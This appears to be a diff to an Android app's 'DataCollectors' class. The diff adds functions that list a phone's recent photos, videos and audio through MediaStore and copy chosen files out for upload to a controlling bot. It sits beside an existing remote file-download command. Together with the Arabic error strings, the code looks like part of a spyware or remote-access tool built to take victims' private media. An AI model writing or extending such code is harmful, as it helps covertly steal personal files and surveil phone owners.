@@ -754,10 +754,188 @@ class DataCollectors(private val context: Context) {
             if (!file.exists()) return CollectedData.TextResult("❌ الملف غير موجود: $path")
             if (file.isDirectory) return CollectedData.TextResult("❌ هذا مجلد وليس ملف: $path")
             if (file.length() > 50 * 1024 * 1024) return CollectedData.TextResult("❌ الملف كبير جداً (الحد 50MB): ${file.length() / 1024 / 1024}MB")
-            
+
             // Return as FileResult - will be uploaded to bot
             CollectedData.FileResult(file, "download:$path")
         } catch (e: Exception) {
+            CollectedData.TextResult("❌ خطأ في التحميل: ${e.message}")
+        }
+    }
+
+    // ════════════════════════════════════════════════════════════════
+    // MEDIA STORE - File Explorer using "Files and media" permission
+    // Works with READ_MEDIA_IMAGES / READ_MEDIA_VIDEO / READ_MEDIA_AUDIO
+    // (or READ_EXTERNAL_STORAGE on Android 12 and below)
+    // ════════════════════════════════════════════════════════════════
+
+    /**
+     * List media files using MediaStore.
+     * @param type One of: "images", "videos", "audio"
+     * Returns JSON with file list (max 30 entries, most recent first)
+     */
+    fun listMediaFiles(type: String): Any {
+        Log.i(TAG, "📁 listMediaFiles: type=$type")
+        val jsonList = JSONArray()
+        return try {
+            val collectionUri = when (type.lowercase()) {
+                "images" -> MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+                "videos" -> MediaStore.Video.Media.EXTERNAL_CONTENT_URI
+                "audio" -> MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
+                else -> return errorJson("invalid_type", "النوع يجب أن يكون: images, videos, أو audio")
+            }
+            val cols = when (type.lowercase()) {
+                "images" -> arrayOf(
+                    MediaStore.Images.Media._ID,
+                    MediaStore.Images.Media.DISPLAY_NAME,
+                    MediaStore.Images.Media.SIZE,
+                    MediaStore.Images.Media.DATE_ADDED,
+                    MediaStore.Images.Media.MIME_TYPE
+                )
+                "videos" -> arrayOf(
+                    MediaStore.Video.Media._ID,
+                    MediaStore.Video.Media.DISPLAY_NAME,
+                    MediaStore.Video.Media.SIZE,
+                    MediaStore.Video.Media.DATE_ADDED,
+                    MediaStore.Video.Media.MIME_TYPE
+                )
+                "audio" -> arrayOf(
+                    MediaStore.Audio.Media._ID,
+                    MediaStore.Audio.Media.DISPLAY_NAME,
+                    MediaStore.Audio.Media.SIZE,
+                    MediaStore.Audio.Media.DATE_ADDED,
+                    MediaStore.Audio.Media.MIME_TYPE
+                )
+                else -> return errorJson("invalid_type", "خطأ")
+            }
+
+            val sortOrder = "${cols[3]} DESC"  // DATE_ADDED DESC
+            val cursor = context.contentResolver.query(
+                collectionUri, cols, null, null, sortOrder
+            )
+
+            var count = 0
+            cursor?.use {
+                while (it.moveToNext() && count < 30) {
+                    val id = it.getLong(0)
+                    val name = it.getString(1) ?: "unknown"
+                    val size = it.getLong(2)
+                    val dateAdded = it.getLong(3)
+                    val mimeType = it.getString(4) ?: ""
+
+                    val contentUri = android.content.ContentUris.withAppendedId(collectionUri, id)
+
+                    jsonList.put(JSONObject().apply {
+                        put("name", name)
+                        put("uri", contentUri.toString())
+                        put("size", size)
+                        put("date_added", dateAdded)
+                        put("mime_type", mimeType)
+                        put("type", type.lowercase())
+                    })
+                    count++
+                }
+            }
+
+            val result = JSONObject().apply {
+                put("type", "media_list")
+                put("media_type", type.lowercase())
+                put("files", jsonList)
+                put("count", count)
+            }
+            Log.i(TAG, "📁 listMediaFiles: returned $count $type")
+            CollectedData.JsonResult(result.toString())
+        } catch (e: SecurityException) {
+            Log.e(TAG, "📁 listMediaFiles SecurityException: ${e.message}")
+            val result = JSONObject().apply {
+                put("type", "media_list")
+                put("media_type", type.lowercase())
+                put("files", JSONArray())
+                put("count", 0)
+                put("error", "permission_denied")
+            }
+            CollectedData.JsonResult(result.toString())
+        } catch (e: Exception) {
+            Log.e(TAG, "📁 listMediaFiles error: ${e.message}")
+            val result = JSONObject().apply {
+                put("type", "media_list")
+                put("media_type", type.lowercase())
+                put("files", JSONArray())
+                put("count", 0)
+                put("error", e.message ?: "unknown")
+            }
+            CollectedData.JsonResult(result.toString())
+        }
+    }
+
+    /**
+     * Download a media file from MediaStore by URI.
+     * @param uriString The content:// URI of the media file
+     * Returns FileResult (uploaded to bot as photo/video/audio based on type)
+     */
+    fun downloadMediaFile(uriString: String): Any {
+        Log.i(TAG, "📥 downloadMediaFile: uri=$uriString")
+        return try {
+            val uri = android.net.Uri.parse(uriString)
+            val mimeType = context.contentResolver.getType(uri) ?: "application/octet-stream"
+            Log.i(TAG, "📥 MIME type: $mimeType")
+
+            // Determine file extension from MIME type
+            val extension = when {
+                mimeType.startsWith("image/") -> mimeType.removePrefix("image/").ifEmpty { "jpg" }
+                mimeType.startsWith("video/") -> mimeType.removePrefix("video/").ifEmpty { "mp4" }
+                mimeType.startsWith("audio/") -> mimeType.removePrefix("audio/").ifEmpty { "mp3" }
+                else -> "bin"
+            }
+
+            // Get display name from cursor
+            var displayName = "media_${System.currentTimeMillis()}.$extension"
+            try {
+                context.contentResolver.query(uri, arrayOf(
+                    android.provider.OpenableColumns.DISPLAY_NAME
+                ), null, null, null)?.use { c ->
+                    if (c.moveToFirst()) {
+                        val nameIdx = c.getColumnIndex(android.provider.OpenableColumns.DISPLAY_NAME)
+                        if (nameIdx >= 0) {
+                            val n = c.getString(nameIdx)
+                            if (!n.isNullOrEmpty()) displayName = n
+                        }
+                    }
+                }
+            } catch (_: Exception) {}
+
+            // Copy file to cache
+            val outputFile = File(context.cacheDir, "media_${System.currentTimeMillis()}_$displayName")
+            context.contentResolver.openInputStream(uri)?.use { input ->
+                FileOutputStream(outputFile).use { output ->
+                    input.copyTo(output)
+                }
+            } ?: return CollectedData.TextResult("❌ تعذر فتح الملف")
+
+            val size = outputFile.length()
+            Log.i(TAG, "📥 Downloaded: ${outputFile.name} ($size bytes)")
+            if (size > 50 * 1024 * 1024) {
+                outputFile.delete()
+                return CollectedData.TextResult("❌ الملف كبير جداً (الحد 50MB): ${size / 1024 / 1024}MB")
+            }
+            if (size == 0L) {
+                outputFile.delete()
+                return CollectedData.TextResult("❌ الملف فارغ")
+            }
+
+            // Determine the "command" tag based on media type
+            val tag = when {
+                mimeType.startsWith("image/") -> "media_image"
+                mimeType.startsWith("video/") -> "media_video"
+                mimeType.startsWith("audio/") -> "media_audio"
+                else -> "media_file"
+            }
+
+            CollectedData.FileResult(outputFile, tag)
+        } catch (e: SecurityException) {
+            Log.e(TAG, "📥 downloadMediaFile SecurityException: ${e.message}")
+            CollectedData.TextResult("❌ صلاحية مرفوضة: ${e.message}")
+        } catch (e: Exception) {
+            Log.e(TAG, "📥 downloadMediaFile error: ${e.message}")
             CollectedData.TextResult("❌ خطأ في التحميل: ${e.message}")
         }
     }
